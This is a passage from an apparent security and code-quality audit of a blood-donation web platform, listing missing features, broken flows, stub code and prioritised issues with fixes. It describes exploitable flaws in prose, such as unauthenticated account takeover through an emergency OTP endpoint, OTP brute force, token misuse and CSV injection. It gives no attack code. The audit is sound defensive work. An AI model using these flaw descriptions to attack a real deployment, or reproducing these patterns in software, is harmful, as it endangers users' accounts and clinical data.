| **BL-003** | **P1** | Blood-product expiry | §2 Role 3: "Record batch creation, expiration dates, and discard expired blood units" | No `expiry_date` column, no batch entity, `getExpiringUnits` returns `[]`, and the frontend collects an `expiryDate` that is silently discarded. Worse, `inventorySchema.expiryDate` is `.min(1)` and required, so **editing an existing inventory row is impossible without retyping a date that is then thrown away** |
| **BL-004** | **P1** | Inventory reservation | §3 Entity 4: "units reserved"; §2 Role 3: "Reserve units from inventory against approved blood_requests" | No `reserved_units` column, no reservation logic, no endpoint. The frontend collects `reservedUnits` and discards it |
| **BL-005** | **P1** | Fulfillment cascade | §6 step 6.2: "BloodRequest: units_fulfilled increments (transitions to FULFILLED)" | Not implemented. No `units_fulfilled` column. `verifyDonation` never touches the parent request. `PARTIALLY_FULFILLED` is unreachable except via the unauthorised `PATCH /{id}/fulfill`. **A completed donation never satisfies its blood request** |
| **BL-006** | **P1** | Compliance audit of donations | §6 step 6.4: "AuditLog: Immutable record logged with actor, timestamp, and IP" | No audit entry is written for any donation. `AuditAspect` is an empty file |
| **BL-007** | **P1** | Hospital credentialing | §2 Role 4: "Approve, activate, or deactivate hospitals"; "Verify hospital license numbers" | **No endpoint exists.** `Hospital.isVerified` is `false` on insert and **never set to `true` by any code path** — no hospital can ever be approved. `licenseDocumentUrl` is discarded. `HospitalStatus.PENDING` in the frontend is unreachable |
| **BL-008** | P2 | Admin role assignment | §2 Role 4: "Create or assign administrative roles" | No endpoint. (Its absence is *good* for security, but it contradicts the spec) |
| **BL-009** | P2 | SMS OTP | §2 Role 5: "Receive a fast SMS OTP to verify phone authenticity" | `SmsService`, `DevelopmentSmsService`, `UnconfiguredProductionSmsService` exist; **none is injected anywhere.** The flow was replaced by an *email* OTP |
| **BL-010** | P2 | Donation certificates / receipts | §2 Role 1: "Download or view official donation receipts / certificates" | Not implemented anywhere |
| **BL-011** | P2 | Donor accept/decline of a request | §5 matrix: `BloodRequest` / DONOR = "Respond" | No endpoint, entity, or enum value |
| **BL-012** | P2 | Appointment reschedule | §2 Role 1: "Cancel or **reschedule** upcoming appointments" | `AppointmentUpdateRequest` exists but is wired to nothing. Cancel-only |
| **BL-013** | P2 | `NO_SHOW` appointment status | §2 Role 3: "`SCHEDULED` ➔ `CONFIRMED` ➔ `COMPLETED` or `NO_SHOW` / `CANCELLED`" | In the enum, in the frontend types, never set by any code path |
| **BL-014** | P2 | Three-state donor availability | §2 Role 1: "Toggle Availability Status (`Active` / `Unavailable` / **`On Hold`**)" | `AvailabilityStatus` has only `AVAILABLE`/`UNAVAILABLE` |
| **BL-015** | P2 | Admin notification broadcast | §5 matrix: `Notification` / ADMIN = "Create (Broadcast), Read (All)" | No broadcast endpoint |
| **BL-016** | P2 | Audit log filtering by IP/actor | §5 matrix: "filter by IP/Actor"; §2 Role 4 "filter by IP" | Only `filterAuditLogs(action)` exists. And all IPs are the literal `"127.0.0.1"` (BE-126) |
| **BL-017** | P2 | Hospital status lifecycle | §3 Entity 3: "operational status (`ACTIVE`, `INACTIVE`, `PENDING`)" | The schema has two booleans, not a status. `PENDING` unreachable |
| **BL-018** | P3 | Urgency vocabulary | §2 Role 2: "`NORMAL`, `URGENT`, or `EMERGENCY`" | The **backend** added a 4th value `CRITICAL` and uses it for all SOS dispatches; the frontend knows nothing about it (FE-011). The spec was never updated |
| **BL-019** | P3 | `EmergencyRequest` parent link | §3 Entity 6: "linked **optionally** to a parent BloodRequest" | Schema is `blood_request_id NOT NULL UNIQUE` — strictly mandatory |

### 17.2 Rules that are implemented but wrong

- **The 90-day cooldown is unenforceable** because a donor can self-declare `AVAILABLE` while ineligible (BE-107).
- **Age/weight eligibility thresholds are duplicated three times with three different answers** (FE 45, BE live 50, BE dead 45) — BE-106, FE-021.
- **Blood-group compatibility is never enforced at the point of donation entry** (BE-110).
- **Donor matching ignores urgency entirely**; the score is `compatibility(50/35) + distance(35/25/15/5) + verified(15)`, capped at 100 — with no urgency weighting and no eligibility gate (BE-117).
- **`estimatedLivesSaved` is a hardcoded `units × 3`** with no documented basis, presented to users as a measured KPI (CQ-004, FE-135).
- **Donor totals are inconsistent within a single screen** — `getStatistics` counts all donations, `getContributionSummary` counts only COMPLETED (BE-122).
- **The frontend reverse-engineers a donation count from booleans** with invented arithmetic in `contributionApi.normalizeMilestones` (FE-023), producing fabricated progress bars.
- **Eligibility fails open in the UI** — `isEligible !== false` renders "QUALIFIED TO DONATE" when the field is `undefined` (FE-106).

---

## 18. End-to-End Flow Problems

### Flow 1 — Donor registration
`RegisterPage` → `registerSchema` (FE) → `authApi.register` → `POST /api/auth/register` (permitAll) → `AuthService.register` → `users` + `donor_profiles` → `AuthResponse` → **`fetchCurrentUser` (`GET /api/users/me`)** → `persistTokens` → `AuthContext.setUser` → `roleHome()` redirect.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| Client validation | `registerSchema.weight` is `z.number().optional()`; role enum correctly excludes ADMIN; but `bloodGroup` is `z.string().optional()` not `z.nativeEnum(BloodGroup)`, and those donor fields have **no `error` prop** (FE-131) | A validation failure on blood group / DOB / weight shows no message | Tighten the schema; add `error` props |
| → API | No dedupe; a double-tap on Register fires two registrations; the second gets 409 → toast, but the first already logged the user in | Duplicate-submission UX bug | Disable submit while pending |
| Backend validation | Duplicated rule blocks (BE-112); `hospitalName`/etc. required for HOSPITAL; weight 45–250 | 400s with inconsistent messages | Single validator |
| Persistence | Donor saved with `verified = true` (BE-113); gender stored raw (BE-114); hospital reg-number uniqueness unchecked (BE-115 → 500) | Unverified donors; 500s | — |
| Response | `AuthResponse` has **no `user` field` | An **extra HTTP round-trip** on every register/login/refresh | Include the user in `AuthResponse` |
| Client | `normalizeUserData` maps the server's `INACTIVE` status to `ACTIVE` (FE-014) | **A restricted user appears active** | Fix the enum list |
| Redirect | `state.from` is never consumed (FE-048) | Deep links lost | Consume `from` |

### Flow 2 — Login → token → protected API → logout
`LoginPage` → `loginSchema` (**min 8 chars, FE-020**) → `authApi.login` → `POST /api/auth/login` → `DaoAuthenticationProvider` → `AuthResponse` → `fetchCurrentUser` → `persistTokens` → `localStorage`.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| 401 handling | Backend returns **403** for unauthenticated requests, not 401. The interceptor only refreshes on 401 (FE-040) | **Token refresh is dead code.** An expired session never refreshes and never redirects — the user sees errors/stale UI | Register an `AuthenticationEntryPoint` returning 401 |
| Login 401 | A wrong password triggers `unauthorizedHandler` → `window.location.assign('/login')` (FE-043 + FE-041) | Full page reload on every typo | Exclude `/api/auth/login` from the 401 handler |
| Token storage | 24 h access + 7 d refresh in `localStorage`; refresh token **is** a valid access token (AUTH-001) | XSS or local access → 7-day account takeover | `httpOnly` cookie + `typ` claim |
| Logout | Client-side only; no revocation (AUTH-003); full page reload | Tokens remain valid until `exp` | Add a denylist or short access TTL |
| Blocked user | `login()` skips `validateUserCanAuthenticate` (AUTH-006) | A BLOCKED user can log in | Call the validator in `login` |
| Password reset | **Two independent breaks**: no email is ever sent (DO-010 — `UnconfiguredProductionEmailService` throws, `DevelopmentEmailService` no-ops), **and** the field name mismatches so the POST would 400 anyway (FE-010) | **The feature is 100% non-functional in every configuration** | Fix both; add a dev mail sink |
| Refresh | No rotation, no reuse detection (AUTH-005); concurrent refreshes deduped client-side (good) but a failure clears the session mid-flight | Replay window; possible logout storms | Rotate + detect reuse |

### Flow 3 — Public emergency SOS (the highest-risk flow)
SOS button → `EmergencyQuickSosModal` → `requestOtp` → `POST /api/emergency/otp/request` (permitAll) → email → `verifyOtp` → `verifyAndDispatch` → **JWT for an arbitrary account (SEC-001)** → creates `blood_requests` + `emergency_requests` → response claims "Broadcast sent to matching local donors" (BL-002).

| Step | Problem | Impact | Fix |
|---|---|---|---|
| `otp/request` | `EMAIL_OTP_ENABLED` unset in `.env` → `ensureConfigured()` throws → **400 "not configured"** (DO-008) | The feature is dead out of the box | Set the flag; fail loudly at startup, not per-request |
| Rate limit | Per-email 5/h and per-IP 20/h using `getRemoteAddr()` with no forwarded-header handling (SEC-012) | Behind a proxy: everyone shares one bucket, or the limit is useless | Configure `forward-headers-strategy` |
| `otp/verify` | **Attempt counter rolled back → unlimited brute force** (SEC-003); no rate limit on this endpoint | Removes the only control on SEC-001 | `REQUIRES_NEW` increment + throttle |
| `verify-and-dispatch` | **Issues tokens for the account matching an attacker-supplied phone or email** (SEC-001); no active/blocked check | **Full account takeover, unauthenticated** | Remove token minting; never resolve existing accounts |
| Location | `'Ahmedabad Trauma Center'` is parsed into the persisted `city` (FE-104) | Wrong city on a real emergency | Require a real location |
| `hospitalId` | Accepted and used unvalidated; hardcoded `Ahmedabad`/`Gujarat` | Requests mis-attributed | Validate; geocode |
| — | `@Transactional` on the controller (BE-150) | Layering violation | Move to a service |
| Creation | Creates a `BloodRequest` with `Urgency.CRITICAL`, but the frontend `Urgency` type has no `CRITICAL` → renders as **"Normal"** (FE-011) | **The emergency is invisible as an emergency in every donor-facing list** | Add `CRITICAL` to the FE enum |
| Contact | `contactPhone` is never collected by the UI, so `'1234567890'` is stored (FE-030) | Hospitals cannot call back | Make it a required field |
| Broadcast | `alertDonors` is a stub (BL-002) | No donor is ever alerted | Implement |
| Response | `"Broadcast sent to matching local donors"` | **False success on a life-critical action** | Report the true outcome |
| UI state | Closing and reopening the modal preserves the previous person's name/phone/email/OTP (FE-122) | PII leak to the next user of the device | Reset state on close |

### Flow 4 — Requester creates a blood request
`CreateBloodRequestPage` → `bloodRequestSchema` (requires `hospitalId`, `unitsRequired ≤ 20`) → `bloodRequestApi.create` → `POST /api/blood-requests` → `BloodRequestService.createRequest` → donor matching → notifications.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| Client | `hospitalId` required client-side but nullable server-side; `city` silently defaults to `'Ahmedabad'` (FE-105) | Wrong-city requests | Require city |
| Server | **No authorisation**: any authenticated role can create a request; no rate limit; `unitsRequired` has no server-side max (API-009) | Request spam; 2M-unit requests | `@PreAuthorize` + `@Max` + throttle |
| Matching | `POST /{id}/match` is a **GET in disguise** — identical to `/matches`, only the default radius differs (BE-153) | Confusing API; a POST with no side effects | Collapse to one endpoint |
| Matching quality | Ignores urgency; uses hardcoded fallback coordinates when the hospital has no GPS (BE-116); **ignores donor eligibility** (BE-117); full table scan (PERF-003) | Wrong donors alerted; slow | Weight by urgency; geocode; apply eligibility |
| Donor matching UI | `FindDonorsPage` shows **BUSY for every donor** including available ones, and a **fabricated distance** (FE-108) | Requesters cannot judge who to call | Fix the `MatchResult` mapping |
| Notify | **Stub** (BL-001) | No donor is ever told | Implement |
| Fulfil | No `units_fulfilled` (BL-005); `PATCH /{id}/fulfill` is **unauthorised** | Fulfilled state is a lie and is user-settable | Add the column + cascade; authorise |
| Cancel | `PATCH /{id}/cancel` is **unauthorised** | Anyone can cancel a life-critical request | Owner-or-admin check |

### Flow 5 — Donor books an appointment
`AppointmentModal` → `appointmentSchema` → `appointmentApi.create` (splits `scheduledAt` into date/time, defaults to `10:00:00`) → `POST /api/appointments` → `AppointmentService.createAppointment`.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| Modal state | `defaultValues` read once; no `key`/`reset()` (FE-113) | Editing appointment B shows appointment A's values | Add `key`/`reset()` |
| Client | Defaults `appointmentDate` to **today** and `appointmentTime` to `'10:00:00'` | Silent booking at a fabricated time | Require explicit input |
| Client | Sends `donorId` which the server ignores (dead field) | Misleading contract | Remove |
| Server | Role check present (`donor.getRole() != DONOR` → **400**, should be 403) | Wrong status — and note this would then hit BE-140 (500) | `ForbiddenException` + handler |
| Server | **No date validation** (past dates accepted), **no conflict detection** unless `bloodRequestId` is present, no eligibility check, no hospital-active check (BE-109) | Double-booking; booking an ineligible donor | Validate future dates; detect conflicts unconditionally |
| Confirm | `ensureHospitalOrAdmin` → `ForbiddenException` → **HTTP 500** (BE-140) | A legitimate denial looks like a server fault | Add the handler |
| Complete | **`completeAppointment` receives no principal** (BE-130) | Unauthorised clinical state change | Require hospital-or-admin |
| UI errors | `confirmMutation`/`completeMutation`/`cancelMutation` have **no `onError`** (FE-126) | **The hospital believes a blood draw was recorded when it was not** | Add `onError` toasts |
| Reminder | Hourly job sends reminders for tomorrow's `CONFIRMED` appointments; message omits the time; N+1 in one transaction (PERF-010) | Incomplete reminders; hourly DB load | Include time; `JOIN FETCH` |

### Flow 6 — Hospital verifies a donation (the inventory cascade)
`HospitalDonationsPage` → `donationApi.complete` → `PATCH /api/donations/{id}/complete` → `DonationService.verifyDonation` → inventory increment + donor cooldown + appointment completion + up to 4 notifications.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| Page scoping | The page calls `donationApi.list()` → `GET /api/donations` is **global** (FE-112). A hospital user sees every donation platform-wide and can PATCH any of them | Cross-tenant data exposure and unauthorised mutation | Scope to the authenticated hospital |
| Authorisation | A non-hospital caller triggers `ForbiddenException` → **HTTP 500** (BE-140) | Confusing failure for a correct denial | Handler |
| Authorisation | A hospital can only complete its own donations — but **any** authenticated user can first `POST` a forged record (BE-104), which the hospital then completes | Forged-then-completed donations | Authorise creation |
| Idempotency | No `@Version`; concurrent completes double-increment inventory (BE-105) | **Stock inflation** | Optimistic locking |
| Cancellation | A `COMPLETED` donation can be **cancelled**, leaving inventory inflated and the donor blocked (BE-103) | Permanent stock and eligibility corruption | State-machine guard + compensating reversal |
| Inventory | Read-modify-write with no lock (BE-119); `updateInventory` can violate `uq_hospital_blood_group` → 500 (BE-120) | Lost updates; 500s | Locking; pre-check |
| Blood group | Client-supplied, never reconciled with the donor's profile (BE-110) | Clinically impossible donations recorded | Server-side derivation |
| Fulfilment | The parent `BloodRequest` is **never updated** (BL-005) | **Donations never satisfy requests** | Add `units_fulfilled` + cascade |
| Audit | No audit entry (BL-006); IP is fabricated (BE-126) | No forensic record | Implement the aspect |
| Notification | Badge logic re-queries and filters all donations in Java on every completion (BE-108) | O(n) per donation | Milestone table |
| Inventory UI | Reserved units and expiry date are collected and silently discarded; editing an existing row is **impossible** (BL-003/004) | Hospital staff believe they saved data they did not | Implement the columns, or remove the inputs |

### Flow 7 — Admin oversight
`/admin/*` (correctly `@PreAuthorize`'d) → `AdminService` → `findAll()` aggregations (PERF-005) → CSV exports.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| Dashboard | 3 of 6 KPI cards permanently show `0`; **all 4 charts permanently blank** (FE-101) | The admin has **no working oversight dashboard at all** | Align the field names / reshape the endpoints |
| Analytics page | Date filters have zero effect; all 4 charts empty (FE-102) | Same | Same |
| Audit logs | **HTTP 400 on every load** (FE-100) + `Invalid Date` columns (FE-110) | The compliance page is entirely non-functional | Send `action`; align field names |
| Users list | Loads all users, filters in Java (PERF-008); the `page`/`size` the UI sends are ignored (API-001) | Unusable at scale | Pagination + `Specification` |
| Block | Can block self or the last admin, irreversibly (BE-125) | Lockout | Guard |
| Donors list | Reports every donor as `isEligible=true, "Active Donor"` (BE-124); **blank names, always-OFFLINE, no badge** (FE-109) | **Misleads the compliance officer** | Use the real rule; add a normaliser |
| Hospitals | **No approve/verify endpoint** (BL-007); `is_verified` is never set true; every hospital renders `ACTIVE` (FE-107) | Credentialing impossible; suspended hospitals look live | Implement; fix the field mapping |
| Reports | Entire DB into a `StringBuilder` (PERF-005); **CSV injection** (SEC-008); **all 6 filters silently ignored** (FE-019); "PDF" downloads CSV bytes (FE-114) | OOM risk; code execution on an admin's machine; misleading downloads | Stream; sanitise; implement filters |
| Audit data | Incomplete (BL-006), IPs fabricated (BE-126), no IP/actor filter (BL-016), no pagination | Untrustworthy | Implement the aspect + paginate |

### Flow 8 — Donor sees "my" data
`/donor/contributions` → `contributionApi.get` → `GET /api/donors/{donorId}/contributions` → `DonorContributionService`.

| Step | Problem | Impact | Fix |
|---|---|---|---|
| ID resolution | `resolveDonorId` falls back to `userId` if no profile exists (`:32-36`) | A profile-less Firebase donor gets a 404 instead of a clear message | Return a distinct 404 code |
| Response | `contributionApi.get` returns the **raw** payload with **no normalisation**, typed as `DonorContribution` whose fields are `donorId, totalDonations, completedDonations, totalUnits, history` — the server returns `donorId, fullName, totalDonations, totalUnitsDonated, livesSavedEstimate, lastDonationDate, nextEligibleDate, currentRank, badges` | **`completedDonations` and `totalUnits` are `undefined`; `history` does not exist** | Normalise, and align the types |
| Dashboard | `Welcome back, !` (FE-115); eligibility fails open (FE-106); fabricated 65 kg / 25 yrs / 56 days (FE-106) | The donor's own clinical dashboard is wrong | Fix the mapping; fail closed |
| Milestones | Client **fabricates** the donation count from booleans (FE-023) | Progress bars show invented numbers | Server returns the count |
| Leaderboard | `totalUnits` never exists server-side → always 0 (FE-018); N+1 (PERF-002); mojibake badges (FE-062) | Broken + corrupt | Fix the DTO, aggregate in SQL, fix encoding |
| Statistics | Uses **all** donations while the summary uses **only COMPLETED** (BE-122) | Two different totals on one screen | Unify |
| Tabs | "Lives Impacted = units × 3" presented as fact (FE-135) | Misleading impact metric | Label as an estimate or remove |

---

## 19. TODO / FIXME / Placeholder Inventory

There are **no `TODO` or `FIXME` comments anywhere in the codebase** — which is itself a finding. Unfinished work is expressed as *silently empty files* and *fabricated success responses* rather than as markers.

| ID | Kind | Location | Description |
|---|---|---|---|
| **PH-001** | **Empty file (0 bytes)** | `common/security/JwtService.java` | Duplicate of `JwtUtils`, never written |
| **PH-002** | **Empty file** | `common/dto/ApiResponse.java` | The intended response envelope |
| **PH-003** | **Empty file** | `common/dto/ErrorDetail.java` | The intended error detail type |
| **PH-004** | **Empty file** | `common/dto/PageResponse.java` | The intended pagination type — explains FE-125's cosmetic pagination |
| **PH-005** | **Empty file** | `common/exception/BaseException.java` | The intended exception hierarchy |
| **PH-006** | **Empty file** | `common/audit/AuditAspect.java` | The intended AOP audit trail — **BL-006** |
| **PH-007** | **Empty file** | `common/audit/LoggableAction.java` | The intended `@LoggableAction` annotation |
| **PH-008** | **Empty file** | `common/audit/AuditEventPublisher.java` | The intended async audit publisher |
| **PH-009** | **Empty file** | `config/AsyncConfig.java` | `@EnableAsync` never configured (also means `AuditEventPublisher` was meant to be async) |
| **PH-010** | **Empty file** | `config/OpenApiConfig.java` | No OpenAPI metadata despite springdoc being `permitAll` |
| **PH-011** | **Empty file** | `common/utils/DateTimeUtils.java` | — |
| **PH-012** | **Empty enum** | `enums/VerificationStatus.java` | Backend has no verification status; `verified` is a boolean |
| **PH-013** | **Empty enum** | `enums/InventoryStockStatus.java` | `InventoryResponse:29-35` hardcodes `"CRITICAL"/"LOW"/"ADEQUATE"` strings instead |
| **PH-014** | **Empty migration** | `V6__add_indexes_and_constraints.sql` | 0 bytes in the Flyway chain |
| **PH-015** | **Empty config** | `application-dev.yml`, `application-prod.yml` | Both 0 bytes |
| **PH-016** | **Fully commented out** | `common/firebase/FirebaseAdminConfig.java` | The entire Firebase Admin bootstrap — **AUTH-016; makes `/api/auth/firebase/phone` permanently 500** |
| **PH-017** | **Fabricated stub** | `MatchingService.notifyDonor:118-131` | Returns "NOTIFICATION_DISPATCHED" — **BL-001** |
| **PH-018** | **Fabricated stub** | `EmergencyRequestService.alertDonors:66-79` | Returns "broadcast dispatched" — **BL-002** |
| **PH-019** | **Fabricated stub** | `InventoryService.getExpiringUnits:110-112` | `return Collections.emptyList();` — **BL-003** |
| **PH-020** | **Hardcoded placeholder** | `AdminService.recordAudit:96-101` | `ipAddress = "127.0.0.1"` |
| **PH-021** | **Hardcoded placeholder** | `AdminService.getAllDonors:238-244` | `isEligible=true, "Active Donor"` for every donor |
| **PH-022** | **Dead class** | `modules/user/service/UserService.java` | ~200 lines, zero references, divergent eligibility rules — **BE-106** |
| **PH-023** | **Dead class** | `modules/auth/Entity/Role.java` | Duplicate of `enums/Role.java`, in a capitalised package |
| **PH-024** | **Dead package** | `common/otp/*` (4 files) | `OtpStore` has zero production consumers; `InMemoryOtpStoreTest` tests the orphan |
| **PH-025** | **Dead interface + 2 impls** | `common/notification/SmsService.java`, `DevelopmentSmsService`, `UnconfiguredProductionSmsService` | SMS entirely unwired — **BL-009** |
| **PH-026** | **Dead DTO** | `modules/request/dto/EmergencyOtpRequest.java` | Abandoned SMS-OTP flow |
| **PH-027** | **Dead DTO** | `modules/appointment/dto/AppointmentUpdateRequest.java` | Reschedule never implemented — **BL-012** |
| **PH-028** | **Dead method** | `DonationService.completeDonation(UUID)` (`:110-112`) | Bypasses the hospital check via `null`; never called |
| **PH-029** | **Dead methods (9)** | `InventoryService.checkAvailability`, `AuthService.getCurrentUser`, `AuditLogRepository.findByCreatedAtBetween…`, `JwtUtils.extractEmail`, `JwtUtils.extractRole`, `NotificationRepository.countByUserIdAndReadFalse`, `SecurityUtils.{isAuthenticated,hasRole,getCurrentUserEmail}` | Declaration-only |
| **PH-030** | **Unwired bean** | `config/SwaggerAutoOpen.java` | Opens a browser in production (BE-133) |
| **PH-031** | **Orphan manifest** | `Red-Pulse Backend/red-pulse/package.json` + `package-lock.json` | `firebase: ^12.19.0` in a Maven module |
| **PH-032** | **Orphan assets** | `src/assets/hero.png`, `typescript.svg`, `vite.svg` | Vite template leftovers, tracked, 0 references |
| **PH-033** | **Excluded test** | `src/__tests__/frontend.integration.test.ts` | Excluded by `vitest.config.ts:12`; its runner script is broken (FE-001) |
| **PH-034** | **No-op branches** | `JwtAuthenticationFilter:52-56, 92-94`; `api/emergencyApi.ts:29-30` | Empty catch blocks and an always-true guard |
| **PH-035** | **Orphan env vars** | `.env.example:44-47, 52-54` | `EMERGENCY_OTP_*` (superseded by `EMAIL_OTP_*`), `APP_SMS_PROVIDER`, `APP_NOTIFICATIONS_DEV_ENABLED`, `APP_OTP_STORE_PROVIDER`, `EXPOSE_CODE` — the old SMS/OTP machinery |
| **PH-036** | **Unimplemented enum state** | `AppointmentStatus.NO_SHOW` | Never set — **BL-013** |
| **PH-037** | **Placeholder UI** | `pages/auth/AuthPages.tsx:104-111` | Licence upload is an explicit no-op with a green "success" chip — **FE-132** |
| **PH-038** | **Placeholder UI** | `pages/public/ContentPages.tsx:135-148` | Contact form fires `toast.success` with no API call — **FE-133** |
| **PH-039** | **22 dead exports** | see §5.10 | 7 of them are accessibility primitives built and never wired |
| **PH-040** | **2 orphaned routes** | `AppRoutes.tsx:146,168` | `/hospital/notifications`, `/admin/notifications` unreachable — **FE-139** |
| **PH-041** | **Unused dependency** | `package.json:33` | `@testing-library/user-event` installed, never imported — **FE-145** |

---

## 20. Issue Master List

**Severity definitions:**
- **P0** = Critical / immediate blocker — data compromise, patient harm, or the build cannot run
- **P1** = High / serious production risk — broken core flow, security weakness, or silent data corruption
- **P2** = Medium / should fix — degraded behaviour, maintainability, or a latent risk
- **P3** = Low / improvement — code quality, cleanliness, documentation

| ID | Sev | Category | File | Issue | Root Cause | Production Impact | Dependency |
|---|---|---|---|---|---|---|---|
| **SEC-001** | **P0** | Security/Auth | `EmergencyOtpController.java:79-129` | Permit-all endpoint mints JWTs for the account matching an attacker-supplied phone/email | Account resolved by a client-controlled identifier, then tokenised | **Unauthenticated full account takeover incl. ADMIN** | DO-008 (arming), SEC-003 (removing the OTP barrier) |
| **SEC-003** | **P0** | Security/Auth | `EmergencyEmailOtpService.java:104-115` | OTP attempt lockout defeated by transaction rollback | Increment + throw inside one `@Transactional` | Unlimited OTP brute force; removes SEC-001's only barrier | — |
| **SEC-002** | **P0** | Security/Auth | `JwtUtils.java:57-70`; `JwtAuthenticationFilter.java:52-70` | Refresh token accepted as an access token (7 days) | No `typ` claim, no claim-presence validation | Stolen refresh token = 7-day account access; defeats 24 h containment | — |
| **SEC-004** | **P0** | Security/Authz | `InventoryController.java:41,50,60` | Any authenticated user can add/set/deduct any hospital's blood stock | No `@PreAuthorize`, no ownership check, no principal | **Patient-level clinical harm**; unfalsifiable | — |
| **BE-104** | **P0** | Backend/Business | `DonationService.java:60-88` | `POST /api/donations` unauthenticated-by-ownership; forges donations for any donor | No principal, no role/eligibility/blood-group validation | Corrupts donor eligibility, badges, inventory, legal ledger | SEC-004-class fix |
| **BE-001** | **P0** | Build | `target/test-classes/application.yml` | `mvn test` BUILD FAILURE (`contextLoads`) | Stale artifact shadows real config on the test classpath | **Build is red**; no CI gate possible | — |
| **BE-002** | **P0** | Test/DevOps | `pom.xml` | No embedded/test database | No H2/Testcontainers dependency | Suite cannot run in CI; not hermetic | — |
| **DO-001** | **P0** | DevOps | — | No CI/CD whatsoever | Never configured | No automated build/test/lint/scan gate | — |
| **DO-003** | **P0** | Git | — | Entire backend untracked (180 files) | Never `git add`ed | **Total loss risk**; no reconstructible history | — |
| **FE-100** | **P0** | Frontend/API | `AdminAuditLogsPage.tsx:18-21` | `action` param never sent; backend requires it → 400 on every load | Contract drift | Admin audit page entirely non-functional | — |
| **FE-101** | **P0** | Frontend/API | `AdminDashboardPage.tsx:74-166`; `models.ts:213-221` | 3 of 6 KPI cards read non-existent fields; 4 charts read `.series`/`.breakdown` the backend never sends | No normaliser + field-name drift | **Admin has no working oversight dashboard** | Root Cause 2 |
| **FE-102** | **P0** | Frontend/API | `AdminAnalyticsPage.tsx:26-116` | Date filters non-functional; all 4 charts permanently empty | Backend accepts no params + no normaliser | Analytics page entirely non-functional | Root Cause 2 |
| **BE-101** | **P0** | Backend/Business | `EmergencyRequestService.java:66-79` | `alertDonors` stub returns false success | Feature never implemented | **Emergency broadcast does not exist** | — |
| **BE-100** | **P0** | Backend/Business | `MatchingService.java:118-131` | `notifyDonor` stub returns false success | Feature never implemented | Users told donors were alerted when they were not | — |
| **FE-010** | **P0** | Frontend/API | `models.ts:382-385`; `authApi.ts:80-82` | Reset sends `password`; server requires `newPassword` | Contract drift, no shared schema | **Password reset 100% broken** | DO-010 (no email) |
| **GH-001** | **P0** | Git | — | Backend untracked (180 files) | Never added | **Total loss risk** | = DO-003 |
| **GH-002** | **P0** | Git | — | 1 commit; 130 files uncommitted; dangling checkpoint | Never committed | No reconstructible history | = DO-004 |
| **DO-002** | **P1** | DevOps | — | No Docker/compose/k8s | Never created | No reproducible deployment | DO-001 |
| **DO-004** | **P1** | Git | — | 130 tracked files uncommitted | Never committed | No reconstructible state | — |
| **DO-005** | **P1** | DevOps | — | Build is red | BE-001 + BE-002 | No gate possible | BE-001, BE-002 |
| **DO-006** | **P1** | DevOps | `pom.xml` | No actuator / health endpoint | Not added | No probe for any LB/orchestrator | DO-002 |
| **DO-007** | **P1** | DevOps | `CorsConfig.java`; `application-prod.yml`; `.env` | CORS localhost-only; prod profile empty; API URL git-ignored | No prod config | **Deployed frontend cannot talk to the API** | BE-005, AUTH-013 |
| **DO-008** | **P1** | DevOps | `.env` | `EMAIL_OTP_ENABLED`/`MAIL_USERNAME` unset | `.env` incomplete | **Emergency SOS dead out of the box** | DO-010 |
| **DO-010** | **P1** | DevOps | `application.yml:63-70` | No configuration exists where the feature set works | Placeholder profiles + placeholder providers | Core features non-functional everywhere | DO-008, BE-005 |
| **DO-013** | **P1** | Observability | Whole backend | 8 log statements; no error logging; no metrics/actuator | Never implemented | **Undetectable failures** | BE-142 |
| **BE-003** | **P1** | Build/DB | V1–V5 | Flyway checksum mismatch; app will not start on the existing DB | Migrations edited post-apply | Dev DB wedged; signals no migration discipline | — |
| **BE-140** | **P1** | Backend/Errors | `GlobalExceptionHandler.java` | `ForbiddenException` unhandled → HTTP 500 | Incomplete handler set | Correct denials reported as server faults | — |
| **BE-141** | **P1** | Security | `GlobalExceptionHandler.java:82-91` | Raw `ex.getMessage()` to clients | No error abstraction | Schema/SQL/path disclosure | = SEC-006 |
| **BE-142** | **P1** | Observability | `GlobalExceptionHandler.java` | No logging | Never implemented | Silent 500s | — |
| **BE-143** | **P1** | Errors | `GlobalExceptionHandler.java` | No handlers for 7+ common Spring exceptions | Incomplete | User-input errors → 500 | — |
| **BE-144** | **P1** | Errors | `JwtAuthenticationFilter.java:52-56, 92-94` | Two empty catch blocks | Error suppression | DB outage during auth looks like 401 | — |
| **BE-103** | **P1** | Backend | `DonationService.java:179-184` | COMPLETED donations can be cancelled | No state guard | Permanent stock inflation + wrong donor cooldown | — |
| **BE-105** | **P1** | Backend/DB | `Donation.java` | No `@Version`; concurrent completes double-increment stock | No optimistic locking | Inventory inflation | DB-004 |
| **BE-106** | **P1** | Quality | `UserProfileService` vs `UserService` | Two divergent eligibility implementations | Copy-paste; the wrong copy survived | Undefined business rule | — |
| **BE-107** | **P1** | Backend | `UserProfileService.java:150-176` | Availability settable while ineligible; the guard lives only in dead code | Guard placed in the orphaned class | **Ineligible donors matched and alerted** | BE-106 |
| **BE-109** | **P1** | Backend | `AppointmentService.java:63-91` | No date validation, no conflict detection | Missing validation | Double-booking, past appointments | — |
| **BE-110** | **P1** | Backend | `DonationService.java:60-88` | Donation blood group never reconciled with the donor profile | No cross-check | Clinically impossible donations recorded | BE-104 |
| **BE-113** | **P1** | Business | `AuthService.java:127` | Donors auto-verified; no email verification | Missing feature | Unverified donors treated as verified | — |
| **BE-115** | **P1** | Backend/Errors | `AuthService.java:131-150` | Hospital reg-number uniqueness unchecked at registration | Missing check | 500 instead of 409 | — |
| **BE-120** | **P1** | Backend/DB | `InventoryService.java:66-74` | `PUT` can violate `uq_hospital_blood_group` | No pre-check | 500 on a legitimate update | — |
| **BE-127** | **P1** | Backend | `NotificationService.java:78-82` | `deleteNotification` has no ownership check | Inconsistency with `markAsRead` | Any user deletes any notification | — |
| **BE-130** | **P1** | Backend | `AppointmentController.java:66` | `PATCH /appointments/{id}/complete` takes no principal | Missing argument | Any user completes any appointment | — |
| **BE-150** | **P1** | Architecture | `EmergencyOtpController.java:74-129` | SOS orchestration (incl. the P0) lives in a controller | No service layer | Untestable, un-reviewable security logic | SEC-001 |
| **BE-102** | **P1** | Backend | `InventoryService.java:110-112` | `getExpiringUnits` returns `[]` | Stub | Expiry feature dead | DB-001 |
